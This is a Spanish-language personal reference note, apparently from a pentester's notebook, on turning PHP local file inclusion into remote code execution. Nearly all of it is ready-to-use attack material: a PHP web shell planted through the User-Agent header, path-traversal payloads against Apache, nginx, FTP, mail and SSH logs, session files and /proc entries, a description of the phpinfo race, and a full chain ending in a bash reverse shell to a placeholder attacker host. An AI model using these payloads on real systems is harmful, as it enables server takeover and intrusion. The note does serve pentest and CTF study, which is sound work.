---
tipo: meta
aliases:
  - Payloads LFI RCE
  - log poisoning
tags:
  - meta/referencia
  - dominio/web
---

# LFI a RCE - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cuando tenés LFI que **ejecuta** (include de PHP) y querés RCE sin wrapper. La idea común: **envenenar** un archivo que el server ya escribe con datos que controlás, después incluirlo. Criterio en [[LFI - de lectura a RCE]]. `yi``  ` copia.

## Log poisoning — access.log

Paso 1: meter PHP en un campo que el log guarda. El `User-Agent` es el clásico:

`User-Agent: <?php system($_GET['c']); ?>`
Se manda en una petición cualquiera; el server lo escribe en el access.log.

Paso 2: incluir el log:

`?file=../../../var/log/apache2/access.log&c=id`
`?file=../../../var/log/nginx/access.log&c=id`
Al incluirlo, el PHP del User-Agent ejecuta. `&c=id` es el comando.

## Log poisoning — otros logs

`/var/log/apache2/error.log`  errores (a veces reflejan el path pedido)
`/var/log/vsftpd.log`  si hay FTP: el nombre de usuario del login se loguea
`/var/log/mail`  si podés mandar mail al server
`/var/log/auth.log`  el usuario SSH fallido se loguea — `ssh '<?php ...?>'@host`

## Session poisoning

Si la app guarda en sesión algo que controlás (un nombre, una preferencia):

Paso 1: setear el valor con PHP → queda en `/var/lib/php/sessions/sess_<PHPSESSID>`.
Paso 2: incluir el archivo de sesión:

`?file=../../../var/lib/php/sessions/sess_TU_PHPSESSID&c=id`
El PHPSESSID sale de tu cookie.

## `/proc/self/environ`

`?file=../../../proc/self/environ&c=id`
Si podés influir una variable de entorno (el `User-Agent` a veces cae ahí en CGI), el PHP inyectado ejecuta al incluir environ. Depende del SAPI.

## `/proc/self/fd`

`?file=../../../proc/self/fd/N&c=id`
Los descriptores abiertos del proceso — a veces apuntan a logs o a un archivo que envenenaste. Iterar `N`.

## phpinfo LFI race

Si hay un `phpinfo()` accesible: una subida temporal por multipart crea un archivo en `/tmp` que aparece en la salida de phpinfo; se corre una carrera para incluir ese `/tmp/php...` antes de que se borre. Técnica de la clásica advisory de Insomnia; requiere script de carrera.

## Ejemplo — log poisoning completo

```
1. curl -A '<?php system($_GET["c"]); ?>' http://objetivo/
   → el User-Agent queda en el access.log

2. ?file=../../../../var/log/apache2/access.log&c=id
   → uid=33(www-data) ... → RCE

3. ?file=../../../../var/log/apache2/access.log&c=bash+-c+'bash+-i+>%26+/dev/tcp/ATACANTE/443+0>%261'
   → reverse shell
```

## Relacionadas

[[LFI - de lectura a RCE]] · [[LFI - inclusión local]] · [[MOC - File inclusion]]
